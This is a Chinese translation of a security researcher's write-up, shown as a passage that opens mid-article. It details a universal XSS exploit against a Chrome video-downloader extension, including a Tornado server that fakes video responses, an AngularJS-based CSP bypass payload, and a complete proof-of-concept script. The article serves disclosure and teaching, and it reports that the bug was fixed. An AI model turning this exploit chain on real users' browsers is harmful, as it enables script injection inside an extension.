            ) &&
            videoLink.size > 1024 &&
            vd.isVideoUrl(videoLink.url)
        ) {
            vd.tabsData[tabId].videoLinks.push(videoLink);
            vd.updateExtensionIcon(tabId);
        }
    };
在这里，我们开始遇到一些困难。我们希望将`URL`附加到`vd.tabsData[tabId].videoLinks`数组，然而这只会在我们传递以下条件时发生：
    !vd.isVideoLinkAlreadyAdded(
        vd.tabsData[tabId].videoLinks,
        videoLink.url
    ) &&
    videoLink.size > 1024 &&
    vd.isVideoUrl(videoLink.url)
`vd.isVideoLinkAlreadyAdded`是一个简单的检验操作，以查看该URL是否已记录在`vd.tabsData[tabId].videoLinks`数组中。
第二项检查是`videoLink.size`大于`1024`。根据前文，这个值取自检索到的`Content-Length`标头。
为了通过此检查，我们创建了一个基本的`Python Tornado`服务器并创建了一个通配符路由并返回响应：
    ...trimmed for brevity...
    def make_app():
        return tornado.web.Application([
            ...trimmed for brevity...
            (r"/.*", WildcardHandler),
        ])
    ...trimmed for brevity...
    class WildcardHandler(tornado.web.RequestHandler):
        def get(self):
            self.set_header("Content-Type", "video/x-flv")
            self.write( ("A" * 2048 ) )
    ...trimmed for brevity...
现在我们已经链接了那条路线。此时，无论我们的链路具体是什么，它总是会路由到一个返回`>1024`字节的页面。 这为我们提供了绕过过滤的方法。
下一项检查要求`vd.isVideoUrl`函数返回`true`，该函数的代码如下：
    vd.videoFormats = {
        mp4: {
            type: 'mp4'
        },
        flv: {
            type: 'flv'
        },
        mov: {
            type: 'mov'
        },
        webm: {
            type: 'webm'
        }
    };
    vd.isVideoUrl = function(url) {
        var isVideoUrl = false;
        Object.keys(vd.videoFormats).some(function(format) {
            if (url.indexOf(format) != -1) {
                isVideoUrl = true;
                return true;
            }
        });
        return isVideoUrl;
    };
这项检查相当简单。
它将检查内容确保`URL`中包含`mp4，flv，mov或webm`。我们可以通过将`.flv`附加到我们的`url`的payload的末尾来绕过此检查。
由于我们已成功满足条件的所有要求，因此我们的`url`会附加到`vd.tabsData[tabId].videoLinks`数组中。
跳转到包含上面显示的易受攻击函数的原始`popup.js`脚本，我们看到以下内容：
    $(document).ready(function() {
        var videoList = $("#video-list");
        chrome.tabs.query({
            active: true,
            currentWindow: true
        }, function(tabs) {
            console.log(tabs);
            vd.sendMessage({
                message: 'get-video-links',
                tabId: tabs[0].id
            }, function(tabsData) {
                console.log(tabsData);
                if (tabsData.url.indexOf('youtube.com') != -1) {
                    vd.sendMessage({
                        message: 'show-youtube-warning'
                    });
                    return
                }
                var videoLinks = tabsData.videoLinks;
                console.log(videoLinks);
                if (videoLinks.length == 0) {
                    $("#no-video-found").css('display', 'block');
                    videoList.css('display', 'none');
                    return
                }
                $("#no-video-found").css('display', 'none');
                videoList.css('display', 'block');
                videoLinks.forEach(function(videoLink) {
                    videoList.append(vd.createDownloadSection(videoLink));
                })
            });
        });
        $('body').on('click', '.download-button', function(e) {
            e.preventDefault();
            vd.sendMessage({
                message: 'download-video-link',
                url: $(this).attr('href'),
                fileName: $(this).attr('data-file-name')
            });
        });
    });
单击扩展程序的浏览器图标时会触发上述代码。 该扩展程序会在Chrome扩展程序API中查询当前标签的元数据。 此选项卡的ID取自元数据，`get-video-links`调用将发送到后台页面。
这个代码只是`sendResponse（vd.getVideoLinksForTab（request.tabId））`; 它返回我们上面讨论的视频链接数据。
在处理视频链接并将每个视频链接传递给本文开头所示的`vd.createDownloadSection`函数后。我们会看到`HTML`构建了一个使用jQuery的`.append()`函数附加到DOM的字符串。将带有用户输入的原始HTML传递给`append()`是xss的具体应用点。
看来我们可以相对比较容易的将我们的`payload`发送到主机系统。然而 我们还有另一个需要克服的问题存在：`CSP`。
### CSP
有趣的是，此扩展的内容安全策略在其s`cript-src`指令中没有不安全的`eval`。 以下是扩展的详情：
    script-src 'self' https://www.google-analytics.com https://ssl.google-analytics.com https://apis.google.com https://ajax.googleapis.com; style-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src *; object-src 'self'
从上面的内容安全策略（CSP）中我们可以看到script-src如下：
    script-src 'self' https://www.google-analytics.com https://ssl.google-analytics.com https://apis.google.com https://ajax.googleapis.com
此政策阻止我们访问任意网站，并禁止我们进行内联`JavaScript`声明（例如``。我们执行`JavaScript`的唯一方法是从以下某个网站获取资源：
当攻击者希望绕过CSP时，在`script-src`指令中我们可以看到`https://apis.google.com`和`https://ajax.googleapis.com`。
这些站点上托管了许多`JavaScript`库，以及`JSONP`端点 ，两者都可用于绕过内容安全策略。
注意：如果想查看网站是否是添加到CSP的不良来源，请查看CSP评估工具（具体到`@ we1x`）。
对于这个领域的一些先前攻击操作，[`H5SC Minichallenge 3: "Sh*t, it's
CSP!"`](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22)  
，攻击者必须在一个只有白名单`ajax.googeapis.com`的页面上实现`XSS`。 这一挑战与我们现在面临的情况非常相似。
    "ng-app ng-csp>\{\{$on.curry.call().alert(1337
通过修改payload，我们也可以利用此扩展。 以下是使用此技术执行警报的payload（强制Chrome视频下载的XSS）：
    "ng-app ng-csp>\{\{$on.curry.call().alert('XSS in Video Downloader for Chrome by mandatory')\}\}`并获取扩展中包含的资源。
在我们的示例中，我们要包含的资源是`popup.html`页面，该页面通常在用户单击扩展程序的图标时显示。
通过`iframing`此页面以及使用我们之前的payload，我们就得到有一个无需用户交互的漏洞利用方法：
最终的payload如下：
        \{\{$on.curry.call().alert('XSS in Video Downloader for Chrome by mandatory')\}\}test
上述代码为两部分，第一部分为在当前选项栏中设置`videoLinks`数组。 第二部分在一秒钟后触发并生成`iframe`的位置：`chrome-extension://dcfofgiombegngbaofkeebiipcdgpnga/html/popup.html`（弹出页面）。
攻击的最终结果如下：
    import tornado.ioloop
    import tornado.web
    class MainHandler(tornado.web.RequestHandler):
        def get(self):
            self.write("""
        \{\{$on.curry.call().alert('XSS in Video Downloader for Chrome by mandatory')\}\}test
            """)
    class WildcardHandler(tornado.web.RequestHandler):
        def get(self):
            self.set_header("Content-Type", "video/x-flv")
            self.write( ("A" * 2048 ) )
    def make_app():
        return tornado.web.Application([
            (r"/", MainHandler),
            (r"/.*", WildcardHandler),
        ])
    if __name__ == "__main__":
        app = make_app()
        app.listen(8888)
        tornado.ioloop.IOLoop.current().start()
### 防御方法
由于没有方法联系任何一位扩展所有者（各个Chrome扩展程序页面上的最小联系人详细信息）。
我联系了一些在Google上使用Chrome扩展程序安全性的开发者。 他们通知了扩展所有者，并努力对这些扩展进行修复。
这两个扩展的最新版本对上述内容已经进行了修复工作。
    本文翻译自：https://thehackerblog.com/video-download-uxss-exploit-detailed/